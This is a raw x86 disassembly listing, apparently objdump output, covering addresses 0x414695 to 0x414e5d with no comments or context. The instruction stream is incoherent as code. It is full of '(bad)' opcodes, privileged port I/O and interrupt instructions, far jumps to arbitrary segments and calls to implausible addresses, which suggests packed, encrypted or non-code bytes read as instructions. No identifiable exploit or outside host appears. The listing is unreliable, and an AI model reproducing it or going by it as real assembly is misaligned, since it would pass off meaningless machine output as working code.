  414695:	inc    ebx
  414696:	sbb    eax,0xa9a91fbf
  41469b:	aas    
  41469c:	xor    DWORD PTR [ebp+edi*1+0xe],edx
  4146a0:	test   DWORD PTR [edx-0x4e],eax
  4146a3:	bound  edx,QWORD PTR [edi+0x7]
  4146a6:	jmp    0x139d:0x6a0bce25
  4146ad:	jb     0x4146bf
  4146af:	inc    ecx
  4146b0:	rcl    BYTE PTR [ecx-0x4adb15d6],cl
  4146b6:	cmp    eax,0x56a3cb67
  4146bb:	sub    dh,BYTE PTR [edx+0x28]
  4146be:	sti    
  4146bf:	hlt    
  4146c0:	pop    edx
  4146c1:	iret   
  4146c2:	push   0xffffff85
  4146c4:	bound  ebx,QWORD PTR [edi-0x7ee1e754]
  4146ca:	mov    edx,0xafe26b66
  4146cf:	arpl   WORD PTR [eax-0x48],sp
  4146d2:	xchg   ebx,eax
  4146d3:	inc    ebx
  4146d4:	int3   
  4146d5:	ret    
  4146d6:	mov    BYTE PTR [edi+0x5f],bh
  4146d9:	push   es
  4146da:	cld    
  4146db:	fs es loop 0x414742
  4146df:	or     DWORD PTR [ebx+0x6e],0x3a5cb4ca
  4146e6:	pop    ebx
  4146e7:	and    edx,DWORD PTR [esi]
  4146e9:	fisub  DWORD PTR [ebx-0xb]
  4146ec:	mov    BYTE PTR [edi],dl
  4146ee:	jbe    0x414751
  4146f0:	and    dl,BYTE PTR [ecx+0x1d]
  4146f3:	dec    edx
  4146f4:	int    0xa8
  4146f6:	addr16 popf 
  4146f8:	ret    
  4146f9:	inc    esp
  4146fa:	jecxz  0x4146d4
  4146fc:	xchg   ebx,eax
  4146fd:	dec    edx
  4146fe:	push   eax
  4146ff:	inc    esp
  414700:	(bad)  
  414701:	lock mov edi,0x36bdd055
  414707:	stc    
  414708:	xchg   DWORD PTR [ebp-0x434345e7],esi
  41470e:	repz cmp DWORD PTR [ebx-0x10],ebp
  414712:	pop    eax
  414713:	xchg   ebp,eax
  414714:	sub    DWORD PTR [edx-0x2b13c9d],ecx
  41471a:	pop    es
  41471b:	jne    0x414753
  41471d:	add    eax,0xfcbbe385
  414722:	cmp    DWORD PTR [esi],eax
  414724:	cmp    al,BYTE PTR [edx-0x25]
  414727:	xchg   esi,eax
  414728:	in     al,dx
  414729:	xchg   esi,eax
  41472a:	mov    DWORD PTR [esi],ecx
  41472c:	ins    BYTE PTR es:[edi],dx
  41472d:	daa    
  41472e:	inc    ebp
  41472f:	inc    ecx
  414730:	bound  esi,QWORD PTR [edx]
  414732:	sub    DWORD PTR [ecx-0x3e],ebx
  414735:	jge    0x4146bb
  414737:	fidiv  DWORD PTR [esi-0x1e]
  41473a:	and    al,0xdc
  41473c:	push   esi
  41473d:	jp     0x4146c1
  41473f:	push   0x704dfdc0
  414744:	int3   
  414745:	cmp    edx,DWORD PTR [edi-0x6282b3fb]
  41474b:	xchg   edx,eax
  41474c:	fimul  DWORD PTR [ecx]
  41474e:	push   cs
  41474f:	unpcklps xmm1,XMMWORD PTR [ebx-0x55]
  414753:	pop    eax
  414754:	and    BYTE PTR [ecx+0x51],al
  414757:	addr16 jb 0x4147a8
  41475a:	add    BYTE PTR [ebp+0xe4f139b],cl
  414760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414761:	stos   BYTE PTR es:[edi],al
  414762:	dec    edx
  414763:	pop    esp
  414764:	repz mov dl,0xa5
  414767:	mov    cl,0xe4
  414769:	in     al,0x96
  41476b:	psllq  mm4,mm0
  41476e:	cmp    al,0x11
  414770:	ja     0x414772
  414772:	or     cl,BYTE PTR [ebx]
  414774:	and    cl,bh
  414776:	inc    edi
  414777:	jae    0x414767
  414779:	in     al,dx
  41477a:	sub    BYTE PTR [eax+0x491fb9a],ah
  414780:	cmp    BYTE PTR [edx],0x86
  414783:	sub    ah,dh
  414785:	xor    eax,0x314da2cf
  41478a:	sbb    al,0xdb
  41478c:	sub    al,BYTE PTR [ebp-0x69]
  41478f:	ins    BYTE PTR es:[edi],dx
  414790:	mov    ds:0x68e19410,eax
  414795:	jmp    0xc918:0x8d34f6c6
  41479c:	out    0xcf,al
  41479e:	out    0xe0,eax
  4147a0:	addr16 push esi
  4147a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147a3:	fsub   DWORD PTR [ecx-0x443bc015]
  4147a9:	in     al,dx
  4147aa:	nop
  4147ab:	xchg   esp,eax
  4147ac:	add    ebp,eax
  4147ae:	xor    BYTE PTR [edx+0x48],ah
  4147b1:	loope  0x41477b
  4147b3:	popa   
  4147b4:	mov    cl,0xf6
  4147b6:	stos   BYTE PTR es:[edi],al
  4147b7:	jb     0x4147db
  4147b9:	rol    DWORD PTR [esi],1
  4147bb:	mov    edi,0x68e43b3d
  4147c0:	xor    eax,0xc3715528
  4147c5:	or     ah,dh
  4147c7:	loop   0x41480c
  4147c9:	std    
  4147ca:	outs   dx,BYTE PTR ds:[esi]
  4147cb:	xor    cl,BYTE PTR [edi+0x3e]
  4147ce:	or     eax,0x8cbcf5be
  4147d3:	mov    eax,ds:0xd0b0e3bb
  4147d8:	dec    BYTE PTR [edx+0x68]
  4147db:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4147dd:	adc    DWORD PTR [ebx+ebp*4+0x9],esi
  4147e1:	test   eax,0x1b9edd53
  4147e6:	lods   eax,DWORD PTR ds:[esi]
  4147e7:	std    
  4147e8:	mov    dl,0x20
  4147ea:	pop    ecx
  4147eb:	aas    
  4147ec:	not    dh
  4147ee:	(bad)  
  4147ef:	mov    eax,ecx
  4147f1:	loop   0x4147bc
  4147f3:	iret   
  4147f4:	mov    ah,0x17
  4147f6:	jnp    0x4147da
  4147f8:	sub    BYTE PTR [edx-0x7],0xc9
  4147fc:	adc    BYTE PTR [eax],dl
  4147fe:	pusha  
  4147ff:	es push ss
  414801:	mov    ah,0x2c
  414803:	arpl   WORD PTR [ecx],bp
  414805:	and    ecx,DWORD PTR [edi]
  414807:	jo     0x41483b
  414809:	and    ebp,DWORD PTR [ebx*8-0x2f81339f]
  414810:	ss xor eax,0xf2ed6d53
  414816:	add    al,0x7b
  414818:	sub    ah,BYTE PTR [esp+ebx*2+0x3daa6fa1]
  41481f:	mov    ch,0x99
  414821:	mov    WORD PTR [eax+0x4fdc4670],?
  414827:	das    
  414828:	mov    ds:0x2d6b646,eax
  41482d:	stos   BYTE PTR es:[edi],al
  41482e:	cmp    cl,ah
  414830:	xchg   edx,eax
  414831:	not    BYTE PTR [edi-0x7df34b93]
  414837:	mov    edi,0x9ed7fc4d
  41483c:	sbb    ecx,0xb77e3acb
  414842:	aam    0x7a
  414844:	or     al,0xe1
  414846:	push   ebx
  414847:	mov    ch,0x39
  414849:	pop    esp
  41484a:	(bad)  
  41484b:	mov    gs,WORD PTR ds:0xb9f3cdf6
  414851:	in     al,0xe7
  414853:	aas    
  414854:	jb     0x414853
  414856:	inc    ebp
  414857:	lahf   
  414858:	scas   al,BYTE PTR es:[edi]
  414859:	mov    edi,0x22bb4a2f
  41485e:	dec    ebx
  41485f:	icebp  
  414860:	mov    edi,0xa5fe7121
  414865:	test   BYTE PTR [ebp-0x38],al
  414868:	xchg   eax,edi
  41486a:	adc    esp,ecx
  41486c:	pop    edx
  41486d:	je     0x414896
  41486f:	int    0xd8
  414871:	ja     0x414836
  414873:	mov    bl,BYTE PTR [edx]
  414875:	fidivr WORD PTR [edx]
  414877:	(bad)  
  414878:	scas   eax,DWORD PTR es:[edi]
  414879:	xchg   esp,eax
  41487a:	test   edi,ebp
  41487c:	sub    eax,0xc6ed5259
  414881:	rcr    edx,1
  414883:	mov    bl,0xf7
  414885:	cmc    
  414886:	inc    eax
  414887:	jmp    0x50239eb3
  41488c:	enter  0x4034,0xb7
  414890:	cli    
  414891:	xchg   esi,eax
  414892:	retf   0xfcae
  414895:	or     eax,DWORD PTR [ecx-0x19]
  414898:	retf   
  414899:	sahf   
  41489a:	fwait
  41489b:	add    bl,BYTE PTR ss:[ebp+0x55]
  41489f:	sub    al,0xf5
  4148a1:	das    
  4148a2:	or     DWORD PTR [esp+eax*2-0x54],edx
  4148a6:	retf   
  4148a7:	jae    0x41491e
  4148a9:	fbstp  TBYTE PTR [eax+ebp*8-0x4f]
  4148ad:	xchg   esp,eax
  4148ae:	(bad)  
  4148af:	cmp    bh,BYTE PTR [edi+0x2c]
  4148b2:	jmp    0x414842
  4148b4:	inc    esp
  4148b5:	outs   dx,BYTE PTR ds:[esi]
  4148b6:	xor    al,0xa
  4148b8:	mov    ch,0x41
  4148ba:	xchg   ebx,eax
  4148bb:	sub    DWORD PTR [edx],eax
  4148bd:	mov    al,BYTE PTR [esi+eiz*1-0x4b]
  4148c1:	imul   edx,DWORD PTR [ecx],0x1c1f4e21
  4148c7:	jb     0x414917
  4148c9:	imul   BYTE PTR [ecx]
  4148cb:	or     al,0xc6
  4148cd:	push   edi
  4148ce:	dec    edx
  4148cf:	sub    BYTE PTR cs:[edx+0x4c],cl
  4148d3:	fidiv  DWORD PTR [edi+0x1665549f]
  4148d9:	add    al,0x50
  4148db:	(bad)  
  4148dc:	push   ebp
  4148dd:	sbb    cl,BYTE PTR [esp+ecx*4+0x12ee737d]
  4148e4:	sahf   
  4148e5:	(bad)  
  4148e7:	adc    BYTE PTR [edi+edi*8+0x66],cl
  4148eb:	retf   0x98a7
  4148ee:	fidiv  DWORD PTR [esi+0x6]
  4148f1:	sbb    eax,0xb77a77c5
  4148f6:	jb     0x41488f
  4148f8:	push   eax
  4148f9:	mov    esi,0xc6428b47
  4148fe:	js     0x41496b
  414900:	lock adc eax,0x8416e1f8
  414906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414907:	sub    BYTE PTR [ebx-0x6d],bl
  41490a:	in     al,0x9d
  41490c:	shr    dh,cl
  41490e:	adc    al,0x9d
  414910:	(bad)
  414914:	sub    BYTE PTR [ebx+0x4c],al
  414917:	mov    eax,esi
  414919:	xchg   ebx,eax
  41491a:	push   ebx
  41491c:	sbb    edx,edx
  41491e:	ret    
  41491f:	aam    0x9e
  414921:	(bad)  
  414922:	(bad)  
  414923:	std    
  414924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414925:	outs   dx,DWORD PTR ds:[esi]
  414926:	pop    esi
  414927:	repnz cmp DWORD PTR [ecx-0x22],0xffffff92
  41492c:	(bad)  
  41492e:	sub    al,0xd7
  414930:	mov    ds:0x74fc2798,al
  414935:	cmp    al,0x59
  414937:	and    al,0x6b
  414939:	pop    ebx
  41493a:	cwde   
  41493b:	jl     0x4148c8
  41493d:	mov    eax,DWORD PTR [ebp+0x46]
  414940:	test   al,0xe2
  414942:	and    ch,al
  414944:	mov    bh,0x0
  414946:	mov    eax,0xdba55ad2
  41494b:	test   eax,0x86db19de
  414950:	mov    esp,0x222c6b10
  414955:	in     al,0x78
  414957:	adc    BYTE PTR [esi+ebp*4],0x52
  41495b:	mov    bl,0x7d
  41495d:	xor    bh,BYTE PTR [ecx]
  41495f:	pinsrw mm7,WORD PTR [ecx-0x27d2e8f3],0x78
  414967:	and    ecx,DWORD PTR [ebx]
  414969:	retf   
  41496a:	(bad)  
  41496b:	sbb    eax,0x39bb685b
  414970:	ja     0x41497d
  414972:	popa   
  414973:	push   esi
  414974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414975:	(bad)  
  414976:	add    ebp,DWORD PTR [ebx]
  414978:	not    DWORD PTR [bx+0x4f]
  41497c:	or     eax,0x61c4959b
  414981:	xor    al,0xf0
  414983:	adc    dl,dl
  414985:	or     ecx,ebx
  414987:	retf   
  414988:	and    edx,0x28
  41498b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41498c:	mov    ch,0x1c
  41498e:	scas   al,BYTE PTR es:[edi]
  41498f:	push   ds
  414990:	mov    ebx,0xc84dbb79
  414995:	mov    ds:0xdb54b95b,al
  41499a:	les    edi,FWORD PTR [ecx+0x47]
  41499d:	cmp    eax,0xe2eeca4c
  4149a2:	data16 lahf 
  4149a4:	mov    ds,esp
  4149a6:	fdiv   QWORD PTR [esi-0x6b]
  4149a9:	(bad)  
  4149aa:	ret    0x636d
  4149ad:	xor    cl,BYTE PTR [esi+0x1b99738b]
  4149b3:	mov    ds:0x410e3a26,eax
  4149b8:	mov    ah,0xc0
  4149ba:	or     BYTE PTR [esi-0x60152602],ch
  4149c0:	gs push edi
  4149c2:	xor    ah,BYTE PTR [ecx-0x8038b0b]
  4149c8:	xchg   esp,eax
  4149c9:	adc    ebx,DWORD PTR [ebp+0x6b5b5a52]
  4149cf:	mov    ecx,0x5b3bebb2
  4149d4:	mov    ch,BYTE PTR [ecx+ebp*4]
  4149d7:	rcr    DWORD PTR [ecx-0x47590a48],1
  4149dd:	inc    edx
  4149de:	inc    bx
  4149e0:	sub    esi,DWORD PTR [ecx+0x7c]
  4149e3:	and    BYTE PTR [ecx+ebp*2+0x35a6d7a3],bl
  4149ea:	fwait
  4149eb:	jns    0xd45539aa
  4149f1:	push   cs
  4149f2:	dec    esp
  4149f3:	jb     0x4149d8
  4149f5:	pop    edx
  4149f6:	cs ja  0x414982
  4149f9:	cmp    al,0x66
  4149fb:	add    cl,BYTE PTR [edx+0x4afa8b55]
  414a01:	out    dx,eax
  414a02:	inc    esp
  414a03:	sub    BYTE PTR [ebp-0x12],dl
  414a06:	mov    cl,0x10
  414a08:	(bad)  
  414a09:	sub    eax,DWORD PTR [edx+eiz*2+0x63]
  414a0d:	jno    0x4149de
  414a0f:	ja     0x4149d5
  414a11:	xchg   ebx,eax
  414a12:	imul   edi,ebx,0x719ce55a
  414a18:	inc    edx
  414a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a1a:	add    ah,dl
  414a1c:	ret    
  414a1d:	mov    dl,0xda
  414a1f:	cdq    
  414a20:	inc    ecx
  414a21:	mov    dh,BYTE PTR [edi]
  414a23:	jp     0x414a20
  414a25:	fdivr  DWORD PTR [esi-0x76]
  414a28:	into   
  414a29:	mov    cl,0x53
  414a2b:	inc    BYTE PTR [ebp-0x1]
  414a2e:	adc    cl,BYTE PTR [eax]
  414a30:	cli    
  414a31:	sar    BYTE PTR [esi+0x16cf0d9c],0xda
  414a38:	pop    ebx
  414a39:	out    0xa2,eax
  414a3b:	pop    es
  414a3c:	push   esi
  414a3d:	dec    ebp
  414a3e:	mov    al,ds:0xfcc381ac
  414a43:	push   ecx
  414a44:	inc    edi
  414a45:	mov    DWORD PTR [edi-0x40],eax
  414a48:	jge    0x4149f1
  414a4a:	ficom  DWORD PTR [esi+0x5a6746f1]
  414a50:	or     DWORD PTR ds:0xd41b190d,0xe95db59a
  414a5a:	shl    DWORD PTR [ecx-0x3af883fb],cl
  414a60:	out    0x8,eax
  414a62:	loop   0x414a91
  414a64:	cmp    ah,BYTE PTR [edx+esi*8]
  414a67:	mov    ebx,0xb418876f
  414a6c:	aam    0x4d
  414a6e:	xchg   edi,eax
  414a6f:	xchg   ecx,eax
  414a70:	jle    0x414a58
  414a72:	jge    0x414acc
  414a74:	pop    ss
  414a75:	shl    BYTE PTR ds:0x9efac8af,0xeb
  414a7c:	mov    dh,0x9a
  414a7e:	sub    esi,ebx
  414a80:	or     edx,DWORD PTR [eax-0x6a547805]
  414a86:	call   ebx
  414a88:	dec    eax
  414a89:	mov    esp,0xc8787754
  414a8e:	mov    bh,0xc0
  414a90:	loopne 0x414a7b
  414a92:	sub    DWORD PTR [edx+0x64],0xffffffe6
  414a96:	xchg   esp,eax
  414a97:	or     al,0xef
  414a9a:	test   BYTE PTR [ecx-0x7f],cl
  414a9d:	mov    ecx,0x3441389a
  414aa2:	ss pop esp
  414aa4:	or     edx,ebx
  414aa6:	cmc    
  414aa7:	lea    esi,[ebx+ecx*2+0x4c535277]
  414aae:	jp     0x414a8a
  414ab0:	and    ch,dh
  414ab2:	xlat   BYTE PTR ds:[ebx]
  414ab3:	daa    
  414ab4:	lds    ecx,FWORD PTR [esi-0x2e]
  414ab7:	xor    al,0x55
  414ab9:	ret    
  414aba:	cld    
  414abb:	adc    eax,0x773e785a
  414ac0:	push   es
  414ac1:	jb     0x414ae6
  414ac3:	bound  ecx,QWORD PTR [ebp-0x7d4b8fa2]
  414ac9:	inc    edx
  414aca:	jp     0x414abc
  414acc:	mov    al,0xf3
  414ace:	add    DWORD PTR [esi-0x63315810],esp
  414ad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ad5:	push   ds
  414ad6:	jmp    0xe9b8:0xd6c6cd37
  414add:	and    BYTE PTR [esi-0x56],bh
  414ae0:	cld    
  414ae1:	pop    edi
  414ae2:	mov    ecx,0x387da9b3
  414ae7:	and    dl,ah
  414ae9:	mov    ch,0xe4
  414aeb:	call   0x8a4bda50
  414af0:	ds pop ss
  414af2:	mov    ebx,0x22083a76
  414af7:	cmp    eax,0x132c66c
  414afc:	adc    cl,ch
  414afe:	call   0xa3f7a0bc
  414b03:	inc    esi
  414b04:	mov    bh,0xb6
  414b06:	fwait
  414b07:	iret   
  414b08:	jne    0x414b1b
  414b0a:	mov    al,ds:0x535c3988
  414b0f:	rol    DWORD PTR [edi-0x109c2eb0],cl
  414b15:	scas   eax,DWORD PTR es:[edi]
  414b16:	retf   
  414b17:	push   0xffffff85
  414b19:	outs   dx,BYTE PTR ds:[esi]
  414b1a:	fst    QWORD PTR [ebp+eax*2-0x767c36fd]
  414b21:	cmp    eax,0x76f03dea
  414b26:	lea    esi,[ebx+0x7]
  414b29:	push   ecx
  414b2a:	nop
  414b2b:	jnp    0x414ba6
  414b2d:	dec    esi
  414b2e:	push   ds
  414b2f:	(bad)  
  414b31:	xor    BYTE PTR [edx+ebx*1-0x49ae810b],ah
  414b38:	add    ebp,edi
  414b3a:	or     dl,BYTE PTR [eax+ebx*4-0x2d]
  414b3e:	gs adc eax,0x707b1ff8
  414b44:	mov    ch,0x95
  414b46:	test   eax,0x16c450c3
  414b4b:	push   0x20
  414b4d:	inc    ebp
  414b4e:	pop    ecx
  414b4f:	mov    ecx,0x325eacc4
  414b54:	ja     0x414bb8
  414b56:	inc    ebx
  414b57:	mov    cl,0x26
  414b59:	sub    eax,0x2850a826
  414b5e:	mov    bl,0x86
  414b60:	jp     0x414bcf
  414b62:	int3   
  414b63:	pop    ecx
  414b64:	loopne 0x414b35
  414b66:	push   0x1b
  414b68:	hlt    
  414b69:	pushf  
  414b6a:	test   BYTE PTR [edx-0x27bbbb72],dl
  414b70:	je     0x414bde
  414b72:	std    
  414b73:	adc    DWORD PTR [edx+0x67],esi
  414b76:	cmp    BYTE PTR [ebx],dl
  414b78:	mov    BYTE PTR [ecx+0x3c],bl
  414b7b:	js     0x414bbc
  414b7d:	inc    edx
  414b7e:	jge    0x414bd9
  414b80:	(bad)  
  414b81:	push   0x21
  414b83:	push   es
  414b84:	push   esi
  414b85:	mov    bh,0x66
  414b87:	and    al,0xbc
  414b89:	out    0x8d,al
  414b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b8c:	dec    esp
  414b8d:	jg     0x414bfc
  414b8f:	mov    dl,0x12
  414b91:	pop    edx
  414b92:	jmp    0xffa1accc
  414b97:	leave  
  414b98:	push   ecx
  414b99:	fcomp  QWORD PTR [eax]
  414b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b9c:	ins    BYTE PTR es:[edi],dx
  414b9d:	cmp    BYTE PTR ds:0xc5a7ae5e,0x11
  414ba4:	dec    edi
  414ba5:	out    dx,eax
  414ba6:	inc    eax
  414ba7:	jge    0x414b67
  414ba9:	jbe    0x414b3b
  414bab:	loopne 0x414b51
  414bad:	fwait
  414bae:	push   0xe614ea58
  414bb3:	in     eax,0x5a
  414bb5:	(bad)  
  414bb6:	call   DWORD PTR [ebp-0x78a479e0]
  414bbc:	das    
  414bbd:	pop    edi
  414bbe:	outs   dx,BYTE PTR ds:[esi]
  414bbf:	add    al,0xeb
  414bc2:	xor    cl,BYTE PTR [ecx-0x48]
  414bc5:	in     eax,dx
  414bc6:	pop    ebx
  414bc7:	xchg   ebp,eax
  414bc8:	iret   
  414bc9:	mov    edx,0x6f48b7fe
  414bce:	inc    ebx
  414bcf:	ds jp  0x414be6
  414bd2:	push   ebp
  414bd3:	adc    eax,0x6877d6ad
  414bd8:	imul   esi,DWORD PTR [edx-0x7110294c],0x8ec904f3
  414be2:	jp     0x414be5
  414be4:	mov    ebx,ds
  414be6:	mov    al,ds:0xb1d9d924
  414beb:	into   
  414bec:	dec    ecx
  414bed:	push   ebx
  414bee:	sbb    al,0xa4
  414bf0:	jb     0x414c1a
  414bf2:	pop    edx
  414bf3:	adc    esi,DWORD PTR [eax]
  414bf5:	sub    eax,0x4c2f1e6b
  414bfa:	or     edi,esp
  414bfc:	mov    ebp,0xa583ab79
  414c01:	lock mov ah,0x9c
  414c04:	leave  
  414c05:	call   0x4121ee44
  414c0a:	jmp    0x44bee14a
  414c0f:	imul   ebx,DWORD PTR [eax+0x79],0xcce6ea6c
  414c16:	icebp  
  414c17:	mov    al,ds:0x46d81a32
  414c1c:	xor    bh,BYTE PTR [ecx-0x5426662c]
  414c22:	lahf   
  414c23:	mov    al,ds:0x4c8a83c5
  414c28:	rol    BYTE PTR [eax+eiz*8+0x5c],0x8c
  414c2d:	and    ch,dh
  414c2f:	mul    BYTE PTR [ebp+0x2]
  414c32:	ins    BYTE PTR es:[edi],dx
  414c33:	add    ecx,DWORD PTR [ecx-0x7]
  414c36:	jmp    0x414c50
  414c38:	mov    esi,edi
  414c3a:	lock rcl DWORD PTR [esi+0x7b013ded],0x51
  414c42:	aad    0xf6
  414c44:	rcr    DWORD PTR [eax+0x38ef7133],1
  414c4a:	aaa    
  414c4b:	popf   
  414c4c:	sub    BYTE PTR [edi-0x19874913],0x25
  414c53:	call   0x5f63:0x95bf4679
  414c5a:	pop    esp
  414c5b:	inc    ebx
  414c5c:	test   BYTE PTR [edi-0x3a92cbb1],ah
  414c62:	aas    
  414c63:	cld    
  414c64:	test   al,dl
  414c66:	adc    ch,al
  414c68:	(bad)  
  414c69:	daa    
  414c6a:	mov    eax,0xa2820cbe
  414c6f:	mov    ?,ebx
  414c71:	aaa    
  414c72:	mov    WORD PTR [ebx+0x5ec05b80],ss
  414c78:	out    0x9e,eax
  414c7a:	mov    bh,0x31
  414c7c:	(bad)  
  414c7d:	fidivr WORD PTR [edi]
  414c7f:	int3   
  414c80:	mov    ds:0x1ed6755e,al
  414c85:	jmp    0x414ce3
  414c87:	jmp    0x55c462c8
  414c8c:	ins    BYTE PTR es:[edi],dx
  414c8d:	cmp    DWORD PTR ds:0x2f236a2a,ebp
  414c93:	xor    ah,dl
  414c95:	push   esi
  414c96:	cmp    DWORD PTR [edx],0xffffff99
  414c99:	popf   
  414c9a:	lea    esp,[ecx+eiz*1-0x55]
  414c9e:	jne    0x414cad
  414ca0:	stos   BYTE PTR es:[edi],al
  414ca1:	adc    DWORD PTR [ebx-0x291152f9],esi
  414ca7:	stos   DWORD PTR es:[edi],eax
  414ca8:	push   eax
  414ca9:	cmp    BYTE PTR [edi+edx*1],bl
  414cac:	pop    es
  414cad:	xor    esi,DWORD PTR [edx]
  414caf:	and    bl,dh
  414cb1:	fcmovb st,st(2)
  414cb3:	cmp    eax,0x69d1b816
  414cb8:	push   edi
  414cb9:	adc    esi,DWORD PTR [edi-0x4688f9fc]
  414cbf:	inc    edi
  414cc0:	arpl   bp,ax
  414cc2:	iret   
  414cc3:	cmp    DWORD PTR [bx+di-0x738],edi
  414cc8:	cmp    ch,bl
  414cca:	dec    edx
  414ccb:	fwait
  414ccc:	addr16 (bad) 
  414cce:	outs   dx,BYTE PTR ds:[esi]
  414ccf:	iret   
  414cd0:	push   ss
  414cd1:	cli    
  414cd2:	in     al,dx
  414cd3:	sub    al,bh
  414cd5:	mul    DWORD PTR [ebx+ecx*8+0xab4f5db]
  414cdc:	or     edx,DWORD PTR [esi]
  414cde:	xchg   ecx,eax
  414cdf:	popa   
  414ce0:	imul   esp,DWORD PTR [ebx],0xffffffa8
  414ce3:	(bad)  
  414ce4:	ror    bh,cl
  414ce6:	and    DWORD PTR [ecx],ecx
  414ce8:	jle    0x414cb6
  414cea:	pop    edx
  414ceb:	cwde   
  414cec:	adc    eax,0x91e15925
  414cf1:	and    dh,ah
  414cf3:	int3   
  414cf4:	or     ebp,DWORD PTR [ebx+esi*1+0x4a]
  414cf8:	(bad)  
  414cfa:	sbb    BYTE PTR [esi+ecx*1-0x7e9b2ae3],ch
  414d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d02:	sbb    BYTE PTR [esi-0x547bffe1],bl
  414d08:	inc    ebx
  414d09:	mov    ds:0xaaf93729,eax
  414d0e:	cwde   
  414d0f:	push   es
  414d10:	fmulp  st(4),st
  414d12:	cmp    DWORD PTR [edx+0x68],ebx
  414d15:	mov    BYTE PTR [ebp+0x2c],al
  414d18:	add    DWORD PTR [eax-0x79],0x6b
  414d1c:	sahf   
  414d1d:	data16 mov bl,0xb
  414d20:	test   al,0xac
  414d22:	cld    
  414d23:	fldcw  WORD PTR [ebp-0x7d]
  414d26:	fiadd  WORD PTR [edx-0x566b804a]
  414d2c:	sbb    bh,BYTE PTR [edi]
  414d2e:	push   ecx
  414d2f:	mov    gs,edi
  414d31:	sbb    bl,BYTE PTR [ecx-0x7c33eee4]
  414d37:	sub    al,0xc8
  414d39:	out    0x1d,al
  414d3b:	adc    esi,DWORD PTR [ebp+0x74420196]
  414d41:	inc    eax
  414d42:	or     DWORD PTR [ebp+eax*4-0x2d],eax
  414d46:	fld    DWORD PTR [edi+edi*2]
  414d49:	pop    ebx
  414d4a:	call   0xbecc:0xb00e167b
  414d51:	dec    ebp
  414d52:	cwde   
  414d53:	mov    ch,0xe6
  414d55:	xchg   ecx,eax
  414d56:	sbb    ecx,DWORD PTR [edx-0x36]
  414d59:	cmp    al,0x18
  414d5b:	dec    ebp
  414d5c:	add    al,0x53
  414d5e:	rcr    DWORD PTR [eax-0x7e0318ca],1
  414d64:	and    DWORD PTR [edx+0x19],0xffffff8e
  414d68:	push   ebx
  414d69:	jo     0x414d22
  414d6b:	push   es
  414d6c:	mov    ebx,0x5c634a79
  414d71:	lds    ebx,FWORD PTR [ecx-0x279e0caf]
  414d77:	aas    
  414d78:	add    DWORD PTR [ebx+ecx*2+0x39db20cb],eax
  414d7f:	mov    bh,ah
  414d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d82:	lods   al,BYTE PTR ds:[esi]
  414d83:	and    BYTE PTR [ecx],dh
  414d85:	stc    
  414d86:	pop    ecx
  414d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d88:	vminpd ymm0,ymm0,YMMWORD PTR [eax+ebx*8]
  414d8d:	xor    al,0x80
  414d8f:	popf   
  414d90:	bound  ebp,QWORD PTR [ebx+ebp*1-0x6c]
  414d94:	scas   eax,DWORD PTR es:[edi]
  414d95:	call   0x740bcdd7
  414d9a:	push   DWORD PTR [ebp+0x1bce4a3e]
  414da0:	cmp    BYTE PTR [ecx],0x86
  414da3:	(bad)  
  414da4:	or     edx,ebx
  414da6:	stos   DWORD PTR es:[edi],eax
  414da7:	or     BYTE PTR [esi+0x907d594],0x34
  414dae:	and    eax,0x894e82db
  414db3:	push   ecx
  414db4:	adc    al,0x4
  414db6:	and    bl,BYTE PTR [ebx]
  414db8:	je     0x414da3
  414dba:	xchg   BYTE PTR [edx],ch
  414dbc:	or     dh,BYTE PTR [ebx-0x970ba4a]
  414dc2:	mov    bl,0x15
  414dc4:	mov    ds:0x78834257,al
  414dc9:	mov    ch,0xc4
  414dcb:	jecxz  0x414dae
  414dcd:	mov    eax,0xa6b0a43f
  414dd2:	jmp    0x414d6d
  414dd4:	push   ebx
  414dd5:	jno    0x414df0
  414dd7:	sbb    edx,DWORD PTR [ebx]
  414dd9:	or     al,0xdb
  414ddb:	jo     0x414e17
  414ddd:	jb     0x414df9
  414ddf:	push   esp
  414de0:	cmp    BYTE PTR [eax+0x475b6126],ch
  414de6:	jmp    0x414e1d
  414de8:	iret   
  414de9:	sbb    ch,ah
  414deb:	out    dx,eax
  414dec:	ds push 0x7949c4b9
  414df2:	cld    
  414df3:	jp     0x414e0d
  414df5:	lock scas al,BYTE PTR es:[edi]
  414df7:	repz add DWORD PTR fs:[edi+esi*2-0x20992f46],eax
  414e00:	xor    al,0x4
  414e02:	and    eax,0xaeeea425
  414e07:	aas    
  414e08:	rol    BYTE PTR [edx-0x7c0adaf2],1
  414e0e:	or     BYTE PTR [edi+0xd038574],dl
  414e14:	inc    eax
  414e15:	xor    al,0xfc
  414e17:	lahf   
  414e18:	pop    ss
  414e19:	(bad)  
  414e1a:	stc    
  414e1b:	test   al,0x8c
  414e1d:	iret   
  414e1e:	and    DWORD PTR [eax-0x5a0a076],ebp
  414e24:	xchg   ebp,eax
  414e25:	sbb    eax,0xab74499
  414e2a:	add    eax,0xaa441a0f
  414e2f:	cld    
  414e30:	in     eax,dx
  414e31:	xor    BYTE PTR [esi-0x38],0xd9
  414e35:	cmp    ch,BYTE PTR [edx-0x13]
  414e38:	push   ebx
  414e39:	jmp    0x5b6c:0xbbf9bc89
  414e40:	mov    cl,0x7a
  414e42:	data16 outs dx,BYTE PTR ds:[esi]
  414e44:	dec    DWORD PTR [eax]
  414e46:	mul    BYTE PTR [ecx+0x69]
  414e49:	stos   BYTE PTR es:[edi],al
  414e4a:	xor    eax,0x843e8b6a
  414e4f:	dec    edi
  414e50:	icebp  
  414e51:	(bad)  [ebx+0x64b6bc3c]
  414e57:	out    dx,al
  414e58:	xor    eax,0x643538d3
  414e5d:	add    bh,BYTE PTR [ebx-0x45]
